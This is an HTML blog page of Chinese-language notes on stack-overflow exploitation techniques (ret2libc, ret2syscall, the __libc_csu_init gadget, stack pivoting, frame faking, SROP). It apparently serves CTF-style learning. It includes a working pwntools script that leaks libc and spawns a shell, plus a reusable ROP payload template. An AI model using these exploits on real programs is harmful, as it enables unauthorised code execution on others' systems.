@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: http://ogp.me/ns#">
+<head>
+  <meta charset="UTF-8" />
+  <title>How2Stack | A-NOTES</title>
+  <link rel="stylesheet" href="https://alset0326.github.io/extra/normalize.css" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700,700i%7CSource+Code+Pro:400,400i,600" />
+  <link rel="stylesheet" href="https://alset0326.github.io/static/m-light.compiled.css" />
+  <link rel="stylesheet" href="https://alset0326.github.io/extra/highlight.css" />
+  <link rel="icon" href="https://alset0326.github.io/images/logo.jpeg" type="image/jpeg" />
+  <link rel="canonical" href="https://alset0326.github.io/how2stack.html" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#cb4b16" />
+  <meta property="og:site_name" content="A-NOTES" />
+  <meta property="og:title" content="How2Stack" />
+  <meta name="twitter:title" content="How2Stack" />
+  <meta property="og:url" content="https://alset0326.github.io/how2stack.html" />
+  <meta property="og:description" content="How to stack" />
+  <meta name="twitter:description" content="How to stack" />
+  <meta name="twitter:card" content="summary" />
+  <meta property="og:type" content="article" />
+</head>
+<body>
+<header><nav id="navigation">
+  <div class="m-container">
+    <div class="m-row">
+      <a href="https://alset0326.github.io/" id="m-navbar-brand" class="m-col-t-9 m-col-m-none m-left-m">A-NOTE To Remind Something</a>
+      <a id="m-navbar-show" href="#navigation" title="Show navigation" class="m-col-t-3 m-hide-m m-text-right"></a>
+      <a id="m-navbar-hide" href="#" title="Hide navigation" class="m-col-t-3 m-hide-m m-text-right"></a>
+      <div id="m-navbar-collapse" class="m-col-t-12 m-show-m m-col-m-none m-right-m">
+        <div class="m-row">
+          <ol class="m-col-t-6 m-col-m-none">
+            <li><a href="https://alset0326.github.io/">HOME</a></li>
+          </ol>
+          <ol class="m-col-t-6 m-col-m-none" start="2">
+            <li><a href="https://github.com/alset0326">GITHUB</a></li>
+          </ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</nav></header>
+<main>
+<div class="m-container">
+  <div class="m-row">
+    <article class="m-col-m-10 m-nopadb">
+      <header>
+        <h1><a href="https://alset0326.github.io/how2stack.html" rel="bookmark" title="Permalink to How2Stack">
+          <time class="m-date" datetime="2018-04-05T09:00:17.387858+08:00">
+            4 <span class="m-date-day">05</span> 2018
+          </time>
+          How2Stack
+        </a></h1>
+        <p>How to stack</p>
+      </header>
+      <div class="m-clearfix-l"></div>
+<!-- content -->
+<div class="toc">
+<ul>
+<li><a href="#00-return-2-libc">0.0 Return 2 libc</a><ul>
+<li><a href="#putswrite">使用puts/write函数泄露数据</a></li>
+<li><a href="#getsread">使用gets/read函数写入数据</a></li>
+</ul>
+</li>
+<li><a href="#01-return-2-syscall">0.1 Return 2 Syscall</a></li>
+<li><a href="#1-ret2__libc_scu_init-gadget">1. ret2__libc_scu_init / 万能gadget</a></li>
+<li><a href="#2-stack-privot">2. stack privot</a></li>
+<li><a href="#30-frame-faking">3.0 frame faking</a></li>
+<li><a href="#31-frame-faking-to-double-leave">3.1 frame faking to double leave</a></li>
+<li><a href="#4-srop">4. SROP</a></li>
+<li><a href="#5-fspo">5. FSPO</a></li>
+<li><a href="#6-stack-smash-using-abort-message">6. Stack smash / Using abort message</a></li>
+<li><a href="#7-return-2-dl-resolve">7. return 2 dl-resolve</a></li>
+<li><a href="#_1"># 技巧</a><ul>
+<li><a href="#0-one_gadget">0. One_gadget</a></li>
+<li><a href="#1-syscall">1. 固定地址的syscall</a></li>
+<li><a href="#2-leaking-canary-byte-by-byte">2. Leaking canary byte-by-byte</a></li>
+<li><a href="#3">3. 反复触发漏洞函数</a></li>
+<li><a href="#4-shell">4. shell获取小结</a></li>
+<li><a href="#5">5. 地址寻找小结</a><ul>
+<li><a href="#_2">通用寻找</a><ul>
+<li><a href="#_3">直接地址寻找</a></li>
+<li><a href="#got">got表寻找</a></li>
+</ul>
+</li>
+<li><a href="#libc">有libc</a></li>
+<li><a href="#libc_1">无libc</a><ul>
+<li><a href="#dynelf">DynELF</a></li>
+<li><a href="#libc_2">libc数据库</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+<p>尝试顺序</p>
+<p>ret2text(system,'/bin/sh')-&gt;ret2syscall-&gt;ret2libc</p>
+<h1 id="00-return-2-libc">0.0 Return 2 libc</h1>
+<p>ret2libc即控制流程使得执行 libc中的函数，通常是ret至某个函数的plt处或者函数的具体位置(即libc中的位置，可由got表泄露并计算)。</p>
+<p>一般情况下，我们会选择执行system("/bin/sh")，故而此时我们需要知道system函数的地址。</p>
+<p><strong>通常我们ret至plt来调用需要的导入函数（例如puts和gets），这里需要注意函数调用栈的结构，plt的代码通常是使用call跳过来的，因此ret返回到的plt中时，相当于已经执行了call，这时栈顶应该是一个返回地址，参数（rdi、rsi、rdx…）已经被填好，（如果是x86，返回地址后是对应的参数内容，因此栈顶的返回地址需要指向pop的gadget）。</strong></p>
+<h2 id="putswrite">使用<code>puts/write</code>函数泄露数据</h2>
+<p>当原二进制中没有system时，一般需要泄露libc基址，通常会ret至plt['puts']，使用<code>puts</code>函数泄露相关信息，这里需要将参数（rdi、rsi、rdx…）事先填好。</p>
+<p>这里介绍一个二次触发漏洞的技巧，一般流程，代码为x86：</p>
+<ul>
+<li>泄露__libc_start_main地址，因为该地址肯定初始化了</li>
+<li>获取libc版本</li>
+<li>获取system地址与/bin/sh的地址</li>
+<li><strong>再次执行源程序</strong></li>
+<li>触发栈溢出执行system(‘/bin/sh’)</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="c1">##!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ret2libc3&#39;</span><span class="p">)</span>
+
+<span class="n">ret2libc3</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ret2libc3&#39;</span><span class="p">)</span>
+
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">ret2libc3</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">libc_start_main_got</span> <span class="o">=</span> <span class="n">ret2libc3</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span>
+<span class="n">main</span> <span class="o">=</span> <span class="n">ret2libc3</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
+
+<span class="k">print</span> <span class="s2">&quot;leak libc_start_main_got addr and return to main again&quot;</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">112</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">main</span><span class="p">,</span> <span class="n">libc_start_main_got</span><span class="p">])</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Can you find it !?&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s2">&quot;get the related addr&quot;</span>
+<span class="n">libc_start_main_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">,</span> <span class="n">libc_start_main_addr</span><span class="p">)</span>
+<span class="n">libcbase</span> <span class="o">=</span> <span class="n">libc_start_main_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">)</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s2">&quot;get shell&quot;</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">104</span><span class="p">,</span> <span class="n">system_addr</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="n">binsh_addr</span><span class="p">])</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+<h2 id="getsread">使用<code>gets/read</code>函数写入数据</h2>
+<p>当需要写入数据时，可以使用<code>gets</code>函数，这里仍然需要注意将参数（rdi、rsi、rdx…）事先填好。</p>
+<h1 id="01-return-2-syscall">0.1 Return 2 Syscall</h1>
+<p>一般会期望执行</p>
+<div class="highlight"><pre><span></span><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span>
+</pre></div>
+
+<p><strong>需要注意的是，在x64架构上，<code>int 80h</code>指令依然是使用x86的调用规范，而<code>syscall</code>指令才是执行x64调用规范</strong></p>
+<p>这里，x64需要使得</p>
+<ul>
+<li>系统调用号即rax应该为0x3b</li>
+<li>第一个参数即rdi应该指向/bin/sh的地址，其实执行sh的地址也可以</li>
+<li>第二个参数即rsi应该为0</li>
+<li>第三个参数erdx应该为0</li>
+</ul>
+<p>x86需要使得</p>
+<ul>
+<li>系统调用号即eax应该为0xb</li>
+<li>第一个参数即ebx应该指向/bin/sh的地址，其实执行sh的地址也可以</li>
+<li>第二个参数即ecx应该为0</li>
+<li>第三个参数edx应该为0</li>
+</ul>
+<p>搜索可使用</p>
+<div class="highlight"><pre><span></span>ROPgadget --binary rop --nojop --nosys --only <span class="s1">&#39;pop|ret&#39;</span> <span class="p">|</span>grep eax
+</pre></div>
+
+<h1 id="1-ret2__libc_scu_init-gadget">1. ret2__libc_scu_init / 万能gadget</h1>
+<p><strong>原理</strong></p>
+<p>在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)</p>
+<div class="highlight"><pre><span></span>.text:00000000004005C0 ; void _libc_csu_init(void)
+.text:00000000004005C0                 public __libc_csu_init
+.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o
+.text:00000000004005C0                 push    r15
+.text:00000000004005C2                 push    r14
+.text:00000000004005C4                 mov     r15d, edi
+.text:00000000004005C7                 push    r13
+.text:00000000004005C9                 push    r12
+.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
+.text:00000000004005D2                 push    rbp
+.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
+.text:00000000004005DA                 push    rbx
+.text:00000000004005DB                 mov     r14, rsi
+.text:00000000004005DE                 mov     r13, rdx
+.text:00000000004005E1                 sub     rbp, r12
+.text:00000000004005E4                 sub     rsp, 8
+.text:00000000004005E8                 sar     rbp, 3
+.text:00000000004005EC                 call    _init_proc
+.text:00000000004005F1                 test    rbp, rbp
+.text:00000000004005F4                 jz      short loc_400616
+.text:00000000004005F6                 xor     ebx, ebx
+.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
+.text:0000000000400600
+.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
+.text:0000000000400600                 mov     rdx, r13
+.text:0000000000400603                 mov     rsi, r14
+.text:0000000000400606                 mov     edi, r15d
+.text:0000000000400609                 call    qword ptr [r12+rbx*8]
+.text:000000000040060D                 add     rbx, 1
+.text:0000000000400611                 cmp     rbx, rbp
+.text:0000000000400614                 jnz     short loc_400600
+.text:0000000000400616
+.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
+.text:0000000000400616                 add     rsp, 8
+.text:000000000040061A                 pop     rbx
+.text:000000000040061B                 pop     rbp
+.text:000000000040061C                 pop     r12
+.text:000000000040061E                 pop     r13
+.text:0000000000400620                 pop     r14
+.text:0000000000400622                 pop     r15
+.text:0000000000400624                 retn
+.text:0000000000400624 __libc_csu_init endp
+</pre></div>
+
+<p>这里我们可以利用以下几点</p>
+<ul>
+<li>从0x000000000040061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器的数据。</li>
+<li>从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi，<strong>但其实此时rdi的高32位寄存器值为0（自行调试）</strong>，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。</li>
+<li>从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。</li>
+</ul>
+<p><strong><em>模板</em></strong></p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">csu</span><span class="p">(</span><span class="n">got_func</span><span class="p">,</span> <span class="n">got_func_arg3</span><span class="p">,</span> <span class="n">got_func_arg2</span><span class="p">,</span> <span class="n">got_func_arg1</span><span class="p">,</span> <span class="n">ret</span><span class="p">):</span>
+    <span class="c1"># pop rbx,rbp,r12,r13,r14,r15; ret</span>
+    <span class="n">csu_end_addr</span> <span class="o">=</span> <span class="mh">0x000000000040061A</span>
+    <span class="c1"># mov     rdx, r13</span>
+    <span class="c1"># mov     rsi, r14</span>
+    <span class="c1"># mov     edi, r15d</span>
+    <span class="c1"># call    qword ptr [r12+rbx*8]</span>
+    <span class="c1"># add     rbx, 1</span>
+    <span class="c1"># cmp     rbx, rbp</span>
+    <span class="c1"># jnz     short loc_400600</span>
+    <span class="c1"># add     rsp, 8</span>
+    <span class="c1"># pop rbx,rbp,r12,r13,r14,r15</span>
+    <span class="c1"># retn</span>
+    <span class="n">csu_front_addr</span> <span class="o">=</span> <span class="mh">0x0000000000400600</span>
+    <span class="c1"># rbx should be 0,</span>
+    <span class="c1"># rbp should be 1,enable not to jump</span>
+    <span class="c1"># r12 should be the function we want to call</span>
+    <span class="c1"># rdi=edi=r15d</span>
+    <span class="c1"># rsi=r14</span>
+    <span class="c1"># rdx=r13</span>
+    <span class="n">rbx</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">rbp</span> <span class="o">=</span> <span class="n">rbx</span> <span class="o">+</span> <span class="mi">1</span>
+    <span class="n">r12</span> <span class="o">=</span> <span class="n">got_func</span>
+    <span class="n">r15</span> <span class="o">=</span> <span class="n">got_func_arg1</span>
+    <span class="n">r14</span> <span class="o">=</span> <span class="n">got_func_arg2</span>
+    <span class="n">r13</span> <span class="o">=</span> <span class="n">got_func_arg3</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_end_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r13</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r14</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r15</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_front_addr</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x38</span> <span class="c1"># 8pad, rbx,rbp,r12,r13,r14,r15</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">payload</span>
+</pre></div>
+
+<p>通过反复ret至存在溢出的函数，一般的使用方法为</p>
+<div class="highlight"><pre><span></span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">write_got</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// 获得 write的got表地址</span>
+<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">bss_base</span><span class="p">,</span><span class="mi">16</span><span class="p">);</span> <span class="c1">// bss段写入 execve_addr + &#39;/bin/sh\x00&#39;</span>
+<span class="n">execve</span><span class="p">(</span><span class="n">bss_base</span><span class="o">+</span><span class="mi">8</span><span class="p">);</span> <span class="c1">//  执行</span>
+</pre></div>
+
+<p><strong><em>改进</em></strong></p>
+<p>在上面的时候，我们直接利用了这个通用gadgets，其输入的字节长度为128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法</p>
+<p>0.改进1-提前控制RBX与RBP</p>
+<p>可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足cmp的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少16字节，即我们所需的字节数只需要112。</p>
+<p>1.改进2-多次利用</p>
+<p>其实，改进1也算是一种多次利用。我们可以看到我们的gadgets是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次gadgets所需要的字节数。但这里的多次利用需要更加严格的条件</p>
+<ul>
+<li>漏洞可以被多次触发</li>
+<li>在两次触发之间，程序尚未修改r12-r15寄存器，这是因为要两次调用。</li>
+</ul>
+<p><strong>当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。</strong></p>
+<p><strong>gadget</strong></p>
+<p>其实，除了上述这个gadgets，gcc默认还会编译进去一些其它的函数</p>
+<div class="highlight"><pre><span></span>_init
+_start
+call_gmon_start
+deregister_tm_clones
+register_tm_clones
+__do_global_dtors_aux
+frame_dummy
+__libc_csu_init
+__libc_csu_fini
+_fini
+</pre></div>
+
+<p>我们也可以尝试利用其中的一些代码来进行执行。此外，由于PC本身只是将程序的执行地址处的数据传递给CPU，而CPU则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。</p>
+<p>需要一说的是，在上面的libc_csu_init中我们主要利用了以下寄存器</p>
+<ul>
+<li>利用尾部代码控制了rbx，rbp，r12，r13，r14，r15。</li>
+<li>利用中间部分的代码控制了rdx，rsi，edi。</li>
+</ul>
+<p>而其实libc_csu_init的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A是正常的起始地址，<strong>可以看到我们在0x000000000040061f处可以控制rbp寄存器，在0x0000000000400621处可以控制rsi寄存器。</strong>而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。</p>
+<div class="highlight"><pre><span></span>gef➤  x/5i 0x000000000040061A
+   0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx
+   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp
+   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12
+   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13
+   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14
+gef➤  x/5i 0x000000000040061b
+   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp
+   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12
+   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13
+   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14
+   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15
+gef➤  x/5i 0x000000000040061A+3
+   0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp
+   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13
+   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14
+   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15
+   0x400624 &lt;__libc_csu_init+100&gt;:  ret 
+gef➤  x/5i 0x000000000040061e
+   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13
+   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14
+   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15
+   0x400624 &lt;__libc_csu_init+100&gt;:  ret    
+   0x400625:    nop
+gef➤  x/5i 0x000000000040061f
+   0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp
+   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14
+   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15
+   0x400624 &lt;__libc_csu_init+100&gt;:  ret    
+   0x400625:    nop
+gef➤  x/5i 0x0000000000400620
+   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14
+   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15
+   0x400624 &lt;__libc_csu_init+100&gt;:  ret    
+   0x400625:    nop
+   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]
+gef➤  x/5i 0x0000000000400621
+   0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi
+   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15
+   0x400624 &lt;__libc_csu_init+100&gt;:  ret    
+   0x400625:    nop
+gef➤  x/5i 0x000000000040061A+9
+   0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi
+   0x400624 &lt;__libc_csu_init+100&gt;:  ret    
+   0x400625:    nop
+   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]
+   0x400630 &lt;__libc_csu_fini&gt;:  repz ret 
+</pre></div>
+
+<h1 id="2-stack-privot">2. stack privot</h1>
+<p><strong>原理</strong> <em>注意切栈后无法执行<code>system</code>，可以使用<code>one_gadget</code></em></p>
+<p>stack privot，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack privot</p>
+<ul>
+<li>可以控制的栈溢出的字节数较少，难以构造较长的ROP链</li>
+<li>开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>
+<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而利用堆漏洞</li>
+</ul>
+<p>此外，利用stack privot有以下几个要求</p>
+<ul>
+<li>可以控制程序执行流。</li>
+<li>可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是</li>
+</ul>
+<div class="highlight"><pre><span></span>pop rsp/esp
+</pre></div>
+
+<p>当然，还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面的是正常的，下面的是偏移的。</p>
+<div class="highlight"><pre><span></span>gef➤  x/7i 0x000000000040061a
+0x40061a &lt;__libc_csu_init+90&gt;:  pop    rbx
+0x40061b &lt;__libc_csu_init+91&gt;:  pop    rbp
+0x40061c &lt;__libc_csu_init+92&gt;:  pop    r12
+0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13
+0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14
+0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15
+0x400624 &lt;__libc_csu_init+100&gt;: ret    
+gef➤  x/7i 0x000000000040061d
+0x40061d &lt;__libc_csu_init+93&gt;:  pop    rsp
+0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13
+0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14
+0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15
+0x400624 &lt;__libc_csu_init+100&gt;: ret
+</pre></div>
+
+<p>此外，还有更加高级的fake frame。</p>
+<ul>
+<li>存在可以控制内容的内存，一般有如下</li>
+<li>bss段。由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限。</li>
+<li>heap。但是这个需要我们能够泄露堆地址。</li>
+</ul>
+<p>此外，如果能够溢出的字节较少，那么可以通过“抬栈”操作，例如<code>jmp esp</code>之后，可以再<code>sub esp; jmp esp</code>，使得能够执行之前的shellcode</p>
+<h1 id="30-frame-faking">3.0 frame faking</h1>
+<p>这个技巧就是构造一个虚假的栈帧指示寄存器（<code>rbp</code>）来控制程序的执行流。</p>
+<p>注意函数的入口点与出口点的基本操作</p>
+<p>入口点</p>
+<div class="highlight"><pre><span></span>push rbp  # 将rbp压栈
+mov rbp, rsp #将rsp的值赋给rbp
+</pre></div>
+
+<p>出口点</p>
+<div class="highlight"><pre><span></span>leave # mov rsp, rbp; pop rbp
+ret #pop rip，弹出栈顶元素作为程序下一个执行地址
+</pre></div>
+
+<p>其中<code>leave</code>指令相当于</p>
+<div class="highlight"><pre><span></span>mov rsp, rbp # 将rbp的值赋给rsp， 注意这里就切栈了，下面的pop是新栈上的
+pop rbp #弹出rbp
+</pre></div>
+
+<p>这里，如果我们合理构造栈中的rbp，进入leave指令时，上层函数的rbp就会被影响，而rbp是用来调用栈变量的，因此我们可以影响上层函数对栈变量的引用。</p>
+<h1 id="31-frame-faking-to-double-leave">3.1 frame faking to double leave</h1>
+<p>这个技巧是构造一个虚假的栈帧来控制程序的执行流。</p>
+<p>使用<code>leave</code>指令修改rsp</p>
+<p><strong>原理</strong></p>
+<p>概括地讲，我们在之前讲的栈溢出不外乎两种方式</p>
+<ul>
+<li>控制程序RIP</li>
+<li>控制程序RBP</li>
+</ul>
+<p>其最终都是控制程序的执行流。在frame faking中，我们所利用的技巧便是同时控制RBP与RIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其payload如下</p>
+<div class="highlight"><pre><span></span>buffer padding|fake rbp|leave ret addr|
+</pre></div>
+
+<p>即我们利用栈溢出将栈上构造为如上格式。这里我们主要接下后面两个部分</p>
+<ul>
+<li>函数的返回地址被我们覆盖为执行leave ret的地址，这就表明了函数在正常执行完自己的leave ret后，还会再次执行一次leave ret。</li>
+<li>其中fake rbp为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下（fake rbp-&gt;)</li>
+</ul>
+<div class="highlight"><pre><span></span>rbp2|target function addr|leave ret addr
+</pre></div>
+
+<p>这里我们的fake rbp指向rbp2，即它为rbp2所在的地址。通常来说，这里都是我们能够控制的可读的内容。</p>
+<p>程序结束后，其又会执行两次 leave ret addr，所以如果我们在ebp2处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。</p>
+<p>可以看出在fake frame中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与stack privot相似。</p>
+<h1 id="4-srop">4. SROP</h1>
+<div class="highlight"><pre><span></span><span class="nf">extra</span> <span class="no">knowledge</span><span class="err">：</span>
+    <span class="nl">syscall:</span> <span class="nf">sigreturn</span>
+    <span class="err">/*</span><span class="nf">for</span> <span class="no">x86</span><span class="p">*</span><span class="err">/</span>
+    <span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span><span class="mi">0x77</span>
+    <span class="nf">int</span> <span class="mi">80</span><span class="no">h</span>
+    <span class="err">/*</span><span class="nf">for</span> <span class="no">x86_64</span><span class="p">*</span><span class="err">/</span>
+    <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span><span class="mi">0xf</span>
+<span class="nf">syscall</span>
+    <span class="nf">signal</span> <span class="no">handler</span>
+</pre></div>
+
+<p>首先，当由中断或异常产生时，会发出一个信号，然后会送给相关进程，此时系统切换到内核模式。再次返回到用户模式前，内核会执行do_signal()函数，最终会调用setup_frame()函数来设置用户栈。setup_frame函数主要工作是往用户栈中push一个保存有全部寄存器的值和其它重要信息的数据结构(各架构各不相同)，另外还会push一个signal function的返回地址——sigruturn()系统调用的地址。</p>
+<p>当这些准备工作完成后，就开始执行由用户指定的signal function了。当执行完后，因为返回地址被设置为sigreturn()系统调用的地址了，所以此时系统又会陷入内核执行sigreturn()系统调用。此系统调用的主要工作是用原先push到栈中的内容来恢复寄存器的值和相关内容。当系统调用结束后，程序恢复执行。</p>
+<p><strong><em>Exploit</em></strong></p>
+<p>伪造sigcontext结构，push到栈中。伪造过程中需要将eax，ebx，ecx等参数寄存器设置为相关值，eip设置为syscall的地址。并且需要注意的是esp，ebp和es，gs等段寄存器不可直接设置为0，经过个人测试，这样不会成功。</p>
+<p>然后将返回地址设置为sigreturn的地址(或者相关gadget)。</p>
+<p>最后当sigreturn系统调用执行完后，就直接执行你的系统调用了</p>
+<p><strong><em>Point</em></strong></p>
